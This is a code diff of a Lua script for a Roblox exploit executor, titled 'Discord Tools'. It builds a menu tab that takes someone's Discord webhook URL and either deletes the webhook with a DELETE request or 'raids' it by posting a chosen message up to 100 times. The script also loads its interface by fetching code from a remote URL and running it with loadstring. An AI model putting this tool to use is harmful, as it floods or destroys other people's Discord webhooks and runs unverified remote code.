@@ -7,41 +7,33 @@
 local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/LuXSystematic/RobloxScripts/main/UILibrary.lua'))()
 local UI = Library:SetupUI('Discord Tools')
 
+-- Tabs
+local WebhooksTab = UI:CreateTab('Webhooks')
+local CreditsTab = UI:CreateTab('Credits')
+
+-- Variables
+local MsgAmount = 0
+local Request = { Headers = { ['Content-Type'] =  'application/json' } }	
+
 -- UI Hotkey
 UI:SetHotkey('g')
 
--- Tabs
-local WebhookRaiderTab = UI:CreateTab('Webhook Raider')
-
--- Services
-local HttpService = game:GetService('HttpService')
-
--- Variables
-local MsgsToSend = 0
-local Request = {
-	Url = '',
-	Method = '',
-	Body = {},
-	Headers = { ['Content-Type'] =  'application/json' }
-}	
-
 -- Webhook Raider Tab
-WebhookRaiderTab:CreateBox(
+WebhooksTab:CreateBox(
 	'Webhook URL',
 	function (Value)
 		Request.Url = Value
-		getgenv().webhook = Value
 	end
 )
 
-WebhookRaiderTab:CreateBox(
-	'Msg Content',
+WebhooksTab:CreateBox(
+	'Msg To Send',
 	function (Value)
-		Request.Body = HttpService:JSONEncode { content = Value }
+		Request.Body = game:GetService('HttpService'):JSONEncode { content = Value }
 	end
 )
 
-WebhookRaiderTab:CreateSlider(
+WebhooksTab:CreateSlider(
 	'Msg Amount',
 	0,
 	100,
@@ -50,16 +42,28 @@ WebhookRaiderTab:CreateSlider(
 	end
 )
 
-WebhookRaiderTab:CreateButton("Delte - Webhook", function()
-    syn.request({
-        Url = getgenv().webhook,
-        Method = "DELETE"
-    })
-end)
+WebhooksTab:CreateButton(
+    "Delete Webhook", 
+    function()
+        Request.Method = 'DELETE'
+		
+	    local RequestSucceeded, ResultFromRequest = pcall(function ()
+	        syn.request(Request)
+	    end)
+	
+	    if not RequestSucceeded then
+	        UI:Notify('The deletion failed!\n\n' .. ResultFromRequest, 7)
+	    else
+	        UI:Notify('Successfully deleted the webhook.', 7)
+	    end
+	    
+	    Request = {	Headers = { ['Content-Type'] =  'application/json' } }
+    end
+)
 
 
-WebhookRaiderTab:CreateButton(
-	'Send Raid',
+WebhooksTab:CreateButton(
+	'Raid Webhook',
 	function ()
 	    Request.Method = 'POST'
 	    
@@ -71,13 +75,18 @@ WebhookRaiderTab:CreateButton(
 		
 		if not RequestSucceeded then
 		    UI:Notify('The raid failed!\n\n' .. ResultFromRequest, 7)
+		else
+		    UI:Notify('Successfully raided the webhook.', 7)
 		end
 		
-		Request = {
-	        Url = '',
-	        Method = 'POST',
-            Body = {},
-	        Headers = { ['Content-Type'] =  'application/json' }
-        }	
+		Request = { Headers = { ['Content-Type'] =  'application/json' } }	
 	end
+)
+
+-- Credits Tab
+CreditsTab:CreateButton(
+    'Copy Discord Invite',
+    function ()
+        setclipboard('https://discord.gg/MYKWPDyJd6')
+    end
 )
